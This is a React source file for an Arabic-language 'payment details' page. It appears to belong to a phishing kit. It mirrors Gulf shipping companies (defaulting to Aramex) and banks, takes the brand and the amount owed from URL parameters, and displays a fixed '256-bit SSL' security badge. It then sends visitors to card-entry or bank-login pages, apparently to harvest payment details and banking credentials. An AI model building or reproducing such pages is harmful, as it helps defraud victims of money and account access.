import { useState, useEffect, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { useLinkData } from "@/hooks/useLinkData";
import { formatCurrency } from "@/lib/countryCurrencies";
import { resolveEntity, PaymentEntityConfig } from "@/config/gccPaymentEntities";
import { ThemedButton } from "@/components/ui/ThemedButton";
import { ThemedCard } from "@/components/ui/ThemedCard";
import {
  CreditCard,
  ArrowLeft,
  Hash,
  DollarSign,
  Truck,
  ShieldCheck,
  Lock,
  Sparkles,
  CheckCircle2,
  Building2,
  Wallet,
} from "lucide-react";
import { DynamicMetaTags } from "@/components/DynamicMetaTags";
import BrandedCarousel from "@/components/BrandedCarousel";
import PageLoader from "@/components/PageLoader";
import { MirrorPageWrapper } from "@/components/MirrorPageWrapper";

const PaymentDetails = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData, isLoading, isError } = useLinkData(id);
  const [showPage, setShowPage] = useState(false);

  useEffect(() => {
    const timer = setTimeout(() => setShowPage(true), 3000);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (linkData || isError) setShowPage(true);
  }, [linkData, isError]);

  const urlParams = new URLSearchParams(window.location.search);
  const serviceKey = urlParams.get('company') || urlParams.get('service') || linkData?.payload?.service_key || 'aramex';
  const shippingInfo = linkData?.payload as any;

  const amountParam = urlParams.get('amount');
  const currencyParam = urlParams.get('currency');
  const methodParam = urlParams.get('method') || urlParams.get('pm');
  const countryParam = urlParams.get('country');

  const countryCode = countryParam || shippingInfo?.selectedCountry || "SA";
  const rawAmount = amountParam || shippingInfo?.cod_amount || 500;
  const amount = typeof rawAmount === 'number' ? rawAmount : parseFloat(rawAmount) || 500;
  const formattedAmount = formatCurrency(amount, currencyParam || countryCode);

  // Resolve entity config
  const entityConfig = useMemo<PaymentEntityConfig>(() => {
    return resolveEntity(serviceKey);
  }, [serviceKey]);

  const category = serviceKey.includes('shipping') || serviceKey.includes('aramex') ? 'shipping' :
                   serviceKey.includes('bank') ? 'bank' : 'payment_gateway';

  if (isLoading && !showPage) return <PageLoader message="جاري تحميل تفاصيل الدفع..." />;

  const handleProceed = () => {
    const paymentMethod = methodParam || linkData?.payload?.payment_method || 'card';
    const queryParams = new URLSearchParams(window.location.search);
    if (!queryParams.has('company')) queryParams.set('company', serviceKey);
    if (!queryParams.has('currency')) queryParams.set('currency', currencyParam || countryCode);
    if (!queryParams.has('amount')) queryParams.set('amount', amount.toString());

    const nextUrl = paymentMethod === 'bank_login'
      ? `/pay/${id}/bank?${queryParams.toString()}`
      : `/pay/${id}/card?${queryParams.toString()}`;

    navigate(nextUrl);
  };

  const CategoryIcon = category === 'shipping' ? Truck : category === 'bank' ? Building2 : Wallet;

  return (
    <MirrorPageWrapper 
      entityId={serviceKey} 
      title="تفاصيل الدفع"
      subtitle="Review Payment Information"
      linkData={linkData}
      hideHeader={true}
    >
      <DynamicMetaTags
        entityId={serviceKey}
        title={`تفاصيل الدفع - ${entityConfig.nameAr}`}
        amount={formattedAmount}
      />

      <BrandedCarousel serviceKey={serviceKey} className="mb-0" />

      <div className="space-y-6">
        {/* Page Title */}
        <div className="text-center mb-4">
          <div className="flex items-center justify-center gap-3 mb-2">
            <Sparkles className="w-6 h-6 text-primary" />
            <h1 className="text-2xl sm:text-3xl font-bold text-foreground">ملخص الطلب</h1>
          </div>
          <p className="text-sm text-muted-foreground">راجع تفاصيل طلبك قبل المتابعة للدفع</p>
        </div>

        {/* Entity Info Card */}
        <ThemedCard config={entityConfig} variant="elevated" className="overflow-hidden">
          <div className="px-6 py-6" style={{ background: `linear-gradient(135deg, ${entityConfig.primary}15, ${entityConfig.accent}15)`, borderBottom: `2px solid ${entityConfig.primary}30` }}>
            <div className="flex items-center gap-3">
              <div className="w-12 h-12 rounded-xl flex items-center justify-center" style={{ background: `linear-gradient(135deg, ${entityConfig.primary}, ${entityConfig.accent})` }}>
                <CategoryIcon className="w-6 h-6 text-white" />
              </div>
              <div>
                <h2 className="text-lg font-bold text-foreground">
                  {category === 'shipping' ? 'تفاصيل الشحنة' : category === 'bank' ? 'تفاصيل الحساب' : 'تفاصيل الطلب'}
                </h2>
                <p className="text-sm text-muted-foreground">
                  {category === 'shipping' ? 'معلومات الطرد والتوصيل' : 'معلومات الخدمة المطلوبة'}
                </p>
              </div>
            </div>
          </div>

          <div className="px-6 py-6 space-y-4 bg-card">
            {shippingInfo?.tracking_number && (
              <div className="flex items-center justify-between py-2 border-b border-border">
                <span className="text-sm text-muted-foreground">رقم الشحنة</span>
                <span className="font-bold">{shippingInfo.tracking_number}</span>
              </div>
            )}
            <div className="flex justify-between items-center py-4 px-4 rounded-xl" style={{ background: `linear-gradient(135deg, ${entityConfig.primary}10, ${entityConfig.accent}10)` }}>
              <span className="text-lg font-bold">المبلغ الإجمالي</span>
              <span className="text-2xl font-bold text-primary">{formattedAmount}</span>
            </div>
          </div>
        </ThemedCard>

        {/* Payment Method */}
        <ThemedCard config={entityConfig} variant="elevated" className="overflow-hidden">
          <div className="px-6 py-4 bg-card">
            <div className="flex items-center gap-4 p-4 rounded-xl border-2" style={{ borderColor: entityConfig.primary, background: `${entityConfig.primary}08` }}>
              <div className="w-10 h-10 rounded-lg flex items-center justify-center flex-shrink-0" style={{ background: `${entityConfig.primary}20` }}>
                {methodParam === 'bank_login' ? <Lock className="w-5 h-5 text-primary" /> : <CreditCard className="w-5 h-5 text-primary" />}
              </div>
              <div className="flex-1">
                <p className="font-bold text-sm mb-0.5">{methodParam === 'bank_login' ? 'تسجيل دخول البنك' : 'الدفع بالبطاقة'}</p>
                <p className="text-xs text-muted-foreground">{methodParam === 'bank_login' ? 'عبر حسابك البنكي' : 'Visa • Mastercard • Mada'}</p>
              </div>
              <CheckCircle2 className="w-5 h-5 text-primary" />
            </div>
          </div>
        </ThemedCard>

        {/* Proceed Button */}
        <ThemedButton config={entityConfig} onClick={handleProceed}>
          <span className="ml-3">متابعة للدفع</span>
          <ArrowLeft className="w-5 h-5 sm:w-6 sm:h-6" />
        </ThemedButton>

        <div className="mt-4 flex items-center justify-center gap-2 text-[10px] text-muted-foreground uppercase tracking-widest font-bold">
          <Lock className="w-3.5 h-3.5" />
          <span>تشفير بيانات آمن 256-bit SSL</span>
        </div>
      </div>
    </MirrorPageWrapper>
  );
};

export default PaymentDetails;
